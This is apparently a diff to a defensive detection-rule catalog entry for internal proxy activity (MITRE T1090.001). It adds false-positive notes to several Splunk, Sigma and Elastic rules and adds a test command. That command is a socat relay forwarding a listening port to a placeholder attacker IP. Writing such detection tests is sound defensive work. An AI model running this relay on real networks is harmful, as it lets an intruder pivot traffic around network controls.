@@ -89,7 +89,8 @@
           "T1090.001"
         ],
         "fidelity": "signature",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate remote management tools with reverse connection patterns"
       },
       {
         "platform": "splunk",
@@ -100,7 +101,8 @@
           "T1090.001"
         ],
         "fidelity": "signature",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate remote management tools with reverse connection patterns"
       },
       {
         "platform": "splunk",
@@ -114,7 +116,8 @@
         "confidence": "medium",
         "log_ids": [
           "3"
-        ]
+        ],
+        "false_positives": "Legitimate remote management tools with reverse connection patterns"
       },
       {
         "platform": "sigma",
@@ -125,7 +128,8 @@
           "T1090.001"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate remote management tools with reverse connection patterns"
       },
       {
         "platform": "elastic",
@@ -135,7 +139,9 @@
         "attack": [
           "T1090.001"
         ],
-        "fidelity": "signature"
+        "fidelity": "signature",
+        "false_positives": "Legitimate remote management tools with reverse connection patterns",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -171,7 +177,8 @@
         "Review Microsoft Defender for Endpoint, Linux Audit (auditd), Sysmon for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "socat TCP4-LISTEN:<listen_port>,fork TCP4:<attacker_ip>:<handler_port>"
     }
   },
   "type": "command",
